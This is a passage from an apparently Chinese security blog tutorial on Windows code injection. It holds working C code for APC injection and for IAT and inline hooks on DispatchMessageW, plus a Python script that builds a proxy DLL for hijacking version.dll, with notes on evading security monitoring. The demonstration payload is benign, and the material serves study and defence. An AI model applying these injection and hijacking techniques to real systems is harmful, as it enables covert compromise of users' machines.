class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pLoadLibrary) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get LoadLibraryW address.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 7. 获取目标进程的所有线程</span></span><br><span class="line">    DWORD* pThreadIds = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD threadCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!GetProcessThreadList(pid, &amp;pThreadIds, &amp;threadCount)) &#123; <span class="comment">// 使用 injector.h 中的函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enumerate threads.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Enumerated %lu threads in target process.\n&quot;</span>, threadCount);</span><br><span class="line">    <span class="comment">// 8. 遍历线程并插入 APC</span></span><br><span class="line">    <span class="type">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; threadCount; i++) &#123;</span><br><span class="line">        <span class="comment">// 打开线程，必须拥有 THREAD_SET_CONTEXT 访问权限才能通过 QueueUserAPC 注入 </span></span><br><span class="line">        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, pThreadIds[i]); <span class="comment">// [cite: 36]</span></span><br><span class="line">        <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">            <span class="comment">// 核心函数：QueueUserAPC </span></span><br><span class="line">            <span class="comment">// 参数1: 要执行的函数 (LoadLibraryW)</span></span><br><span class="line">            <span class="comment">// 参数2: 目标线程句柄</span></span><br><span class="line">            <span class="comment">// 参数3: 传递给函数的参数 (远程内存中的 DLL 路径)</span></span><br><span class="line">            <span class="keyword">if</span> (QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteMem)) &#123; <span class="comment">// [cite: 37]</span></span><br><span class="line">                successCount++;</span><br><span class="line">                <span class="comment">// printf(&quot;[+] APC queued for Thread ID: %lu\n&quot;, pThreadIds[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully queued APC to %d threads.\n&quot;</span>, successCount);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Waiting for target threads to enter &#x27;Alertable State&#x27; (e.g. SleepEx) to trigger execution...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="keyword">if</span> (pThreadIds) VirtualFree(pThreadIds, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="comment">// 注意：不要过早 VirtualFreeEx pRemoteMem，因为目标线程可能还没执行 APC。</span></span><br><span class="line">    <span class="comment">// 在实际恶意软件中，通常就不释放了，或者等待很长时间。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-2"><a href="#攻击效果-2" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>高隐蔽性 (Stealth)</strong> ： <strong>不创建新线程</strong> 。大多数安全软件会监控 <code>CreateRemoteThread</code>，但对 <code>QueueUserAPC</code> 的监控相对较少。代码复用目标进程现有的线程执行。</li><li><strong>局限性</strong> ：依赖于目标进程的行为（必须调用 <code>SleepEx</code> 等函数），如果目标线程太忙或不进入可警醒状态，注入可能永远不会触发。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765616757981.png" alt="1765616757981"></p><h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。</p><p>如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。</p><h3 id="dll搜索顺序"><a href="#dll搜索顺序" class="headerlink" title="dll搜索顺序"></a>dll搜索顺序</h3><p>dll的搜索顺序一直在变化，包括使用一些安全手段来改变搜索顺序。一般的顺序如下</p><ol><li>应用程序加载的目录</li><li>系统目录，使用 GetSystemDirectory 获取该路径</li><li>16 位系统目录</li><li>Windows 目录，使用 GetWindowsDirectory 获取该路径</li><li>当前目录</li><li>PATH 环境变量中列出的目录</li></ol><p>如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。</p><p>Known DLLs 列表：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p><img src="/image/2025-12-12-windows_dll_injection/1765687938486.png" alt="1765687938486"></p><h3 id="实现方法-1"><a href="#实现方法-1" class="headerlink" title="实现方法"></a>实现方法</h3><p>恶意dll无法做到完全复刻原本的dll的所有函数功能，只能通过函数转发的方式</p><p><img src="/image/2025-12-12-windows_dll_injection/1765844966874.png" alt="1765844966874"></p><p>使用Python 脚本（配合 <code>pefile</code> 库）把原 DLL 所有的函数名（如 <code>malloc</code>, <code>printf</code>, <code>free</code>…）和序号全部读出来，自动按照链接器的语法格式，生成 <code>.def</code> 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target_dll = <span class="string">&quot;version.dll&quot;</span></span><br><span class="line">proxy_dll = <span class="string">&quot;old&quot;</span> + target_dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 检查并重命名原文件</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(target_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Renaming <span class="subst">&#123;target_dll&#125;</span> -&gt; <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    os.rename(target_dll, proxy_dll)</span><br><span class="line"><span class="keyword">elif</span> os.path.exists(proxy_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;target_dll&#125;</span> already renamed to <span class="subst">&#123;proxy_dll&#125;</span>, skipping rename.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: Could not find <span class="subst">&#123;target_dll&#125;</span> or <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 解析 DLL</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pe = pefile.PE(proxy_dll)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] PE Parse Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def_file = target_dll.replace(<span class="string">&quot;.dll&quot;</span>, <span class="string">&quot;.def&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Generating <span class="subst">&#123;def_file&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">forward_module = proxy_dll.replace(<span class="string">&quot;.dll&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(def_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">f&#x27;LIBRARY <span class="subst">&#123;target_dll&#125;</span>\nEXPORTS\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> export <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">            <span class="keyword">if</span> export.name:</span><br><span class="line">                func_name = export.name.decode()</span><br><span class="line">                <span class="comment"># 格式: 导出函数名 = 转发模块.原函数名 @序号</span></span><br><span class="line">                line = <span class="string">f&quot;<span class="subst">&#123;func_name&#125;</span>=<span class="subst">&#123;forward_module&#125;</span>.<span class="subst">&#123;func_name&#125;</span>\t@<span class="subst">&#123;export.ordinal&#125;</span>&quot;</span></span><br><span class="line">                file.write(<span class="string">&quot;\t&quot;</span> + line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No export table found!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Done! Generated <span class="subst">&#123;count&#125;</span> exports.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Compile command: gcc -shared my_hack.c <span class="subst">&#123;def_file&#125;</span> -o <span class="subst">&#123;target_dll&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用 <code>gcc -shared -o payload.dll payload.c payload.def</code>进行编译</p><p><img src="/image/2025-12-12-windows_dll_injection/1765845870344.png" alt="1765845870344"></p><h3 id="攻击效果-3"><a href="#攻击效果-3" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/image/2025-12-12-windows_dll_injection/1765691259175.png" alt="1765691259175"></p><p><img src="/image/2025-12-12-windows_dll_injection/1765691304640.png" alt="1765691304640"></p><h2 id="windows-hook-R3"><a href="#windows-hook-R3" class="headerlink" title="windows hook-R3"></a>windows hook-R3</h2><p>Hook（钩子）技术的核心在于截获软件执行流或消息流，在目标函数执行前、执行中或执行后插入自定义逻辑。根据介入层级和实现方式的不同，可以分为应用层 Hook（Ring 3）、调试型 Hook 、底层虚拟化 Hook（Ring -1）以及内核Hook（Ring 0）。</p><p><img src="/image/2025-12-12-windows_dll_injection/1765691353434.png" alt="1765691353434"></p><h3 id="基于导入表的-Hook-IAT-Hook"><a href="#基于导入表的-Hook-IAT-Hook" class="headerlink" title="基于导入表的 Hook (IAT Hook)"></a>基于导入表的 Hook (IAT Hook)</h3><p>IAT Hook 通过修改 IAT 表中目标函数的地址，将其替换为恶意 Hook 函数的地址。当程序下次“查表”调用该函数时，就会跳转到恶意代码。</p><h4 id="实现方法-2"><a href="#实现方法-2" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong>定位导入表</strong> ：从 DOS 头 -&gt; NT 头 -&gt; 可选头 -&gt; 数据目录中找到  <strong>导入表 (Import Directory)</strong> 。</p><p><strong>定位目标 DLL</strong> ：遍历导入描述符 (<code>IMAGE_IMPORT_DESCRIPTOR</code>)，找到目标 DLL（如 <code>user32.dll</code>）</p><p><strong>双桥遍历</strong> ：同时遍历 <strong>OriginalFirstThunk (INT)</strong> 和  <strong>FirstThunk (IAT)</strong> 。</p><ul><li><code>OriginalFirstThunk</code> 保存函数 <strong>名称</strong> ，永远不会改变，用于匹配目标函数名（如 “DispatchMessageW”）。</li><li><code>FirstThunk</code> 保存函数 <strong>地址</strong> ，用于实施修改。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765846796434.png" alt="1765846796434"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o IATHook_DualBridge.dll IATHook_DualBridge.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MessageBoxW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line">PDispatchMessageW pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否是字符消息 (WM_CHAR = 0x0102)</span></span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> ch = (<span class="type">wchar_t</span>)lpMsg-&gt;wParam; <span class="comment">// wParam 存放的就是字符的 ASCII/Unicode 码</span></span><br><span class="line">        <span class="keyword">if</span>(((MSG*)lpMsg)-&gt;wParam==<span class="string">&#x27;a&#x27;</span>)((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 继续调用原函数，让 Notepad 正常处理</span></span><br><span class="line">    <span class="keyword">return</span> pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">StartIATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取当前模块基址 (注入后即为 Notepad.exe 的基址)</span></span><br><span class="line">    HMODULE hModule = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 2. 获取 DOS 头和 NT 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 3. 获取导入表目录</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + </span><br><span class="line">        pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 4. 遍历导入表寻找 user32.dll</span></span><br><span class="line">    <span class="keyword">while</span> (pImportDesc-&gt;Name) &#123;</span><br><span class="line">        <span class="type">char</span>* pszDllName = (<span class="type">char</span>*)((BYTE*)hModule + pImportDesc-&gt;Name);</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(pszDllName, <span class="string">&quot;user32.dll&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 桥1: OriginalFirstThunk (INT) - 用于查找函数名 [cite: 22]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;OriginalFirstThunk);</span><br><span class="line">            <span class="comment">// 桥2: FirstThunk (IAT) - 用于修改函数地址 [cite: 23]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;FirstThunk);</span><br><span class="line">            <span class="comment">// 同时遍历两个数组，索引是同步的</span></span><br><span class="line">            <span class="keyword">while</span> (pOriginalThunk-&gt;u1.AddressOfData) &#123;</span><br><span class="line">                <span class="comment">// 检查是否通过名称导入 (最高位不是1)</span></span><br><span class="line">                <span class="comment">// IMAGE_ORDINAL_FLAG 在64位下是高位判断，防止读取序号出错</span></span><br><span class="line">                <span class="keyword">if</span> (!(pOriginalThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)) &#123;</span><br><span class="line">                    <span class="comment">// 通过 OriginalThunk 获取函数名结构</span></span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + pOriginalThunk-&gt;u1.AddressOfData);</span><br><span class="line">                    <span class="comment">// 比对函数名</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pImportByName-&gt;Name, <span class="string">&quot;DispatchMessageW&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1. 保存旧地址 (从 FirstThunk 里读)</span></span><br><span class="line">                        pOriginalDispatchMessageW = (PDispatchMessageW)pFirstThunk-&gt;u1.Function;</span><br><span class="line">                        <span class="comment">// 2. 修改内存保护属性</span></span><br><span class="line">                        DWORD dwOldProtect;</span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                        <span class="comment">// 3. 修改 IAT，指向我们的函数 [cite: 27]</span></span><br><span class="line">                        <span class="comment">// 注意：这里修改的是 FirstThunk，不是 OriginalThunk</span></span><br><span class="line">                        pFirstThunk-&gt;u1.Function = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">                        <span class="comment">// 4. 恢复保护</span></span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pOriginalThunk++;</span><br><span class="line">                pFirstThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDesc++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 入口点</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        StartIATHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-4"><a href="#攻击效果-4" class="headerlink" title="攻击效果"></a>攻击效果</h4><p>所有输入的 <code>a</code>都变成了 <code>b</code></p><p><img src="/image/2025-12-12-windows_dll_injection/1765703026493.png" alt="1765703026493"></p><h3 id="基于代码的内联-Hook-Inline-Hook"><a href="#基于代码的内联-Hook-Inline-Hook" class="headerlink" title="基于代码的内联 Hook (Inline Hook)"></a>基于代码的内联 Hook (Inline Hook)</h3><p>Inline Hook 的本质是“劫持”函数入口。<br>它不依赖 PE 结构，而是直接修改目标函数在内存中的 <strong>机器码</strong> 。通常是在函数开头写入一条<strong>JMP</strong>指令。当 CPU 执行到该函数时，立即被强制跳转到 Hook 函数。</p><h4 id="实现方法-3"><a href="#实现方法-3" class="headerlink" title="实现方法"></a>实现方法</h4><p><code>GetProcAddress</code> ：直接获取目标函数的内存地址，无需解析 PE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o InlineHookDll.dll InlineHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 DispatchMessageW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line"></span><br><span class="line">PDispatchMessageW g_pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_OriginalBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 用于保存函数原本的前14个字节</span></span><br><span class="line">BYTE g_PatchBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">// 用于保存我们要写入的 JMP 指令</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// [关键步骤 A] 暂时脱钩 (恢复原始代码)</span></span><br><span class="line">    <span class="comment">// 为什么要恢复？因为我们等下要调用原函数。如果不恢复，</span></span><br><span class="line">    <span class="comment">// 调用原函数时又会遇到 JMP 指令跳回这里，导致死循环 (Stack Overflow)。</span></span><br><span class="line">    UninstallHook();</span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpMsg-&gt;wParam == <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            ((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [关键步骤 C] 调用原函数 (此时原函数已恢复正常)</span></span><br><span class="line">    LRESULT result = g_pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">    <span class="comment">// [关键步骤 D] 重新挂钩</span></span><br><span class="line">    <span class="comment">// 原函数执行完了，赶紧把钩子挂回去，拦截下一次消息</span></span><br><span class="line">    InstallHook();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="comment">// 修改内存权限为可读可写可执行 (User32的代码段通常是只读的) [cite: 32]</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 写入我们要构造好的 JMP 指令</span></span><br><span class="line">    <span class="comment">// 效果：只要 CPU 执行到 DispatchMessageW 开头，就直接跳到 MyDispatchMessageW</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_PatchBytes, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 恢复内存权限</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 把备份的最原始的字节写回去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_OriginalBytes, <span class="number">14</span>);</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取 DispatchMessageW 的真实地址</span></span><br><span class="line">    HMODULE hUser32 = GetModuleHandleW(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pOriginalDispatchMessageW = (PDispatchMessageW)GetProcAddress(hUser32, <span class="string">&quot;DispatchMessageW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pOriginalDispatchMessageW) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(g_OriginalBytes, g_pOriginalDispatchMessageW, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 2. 构造 64位 的绝对跳转指令 (JMP [RIP+0])</span></span><br><span class="line">    <span class="comment">// 指令机器码: FF 25 00 00 00 00 (6字节) + 8字节的目标地址</span></span><br><span class="line">    <span class="comment">// 0xFF 0x25 是 JMP 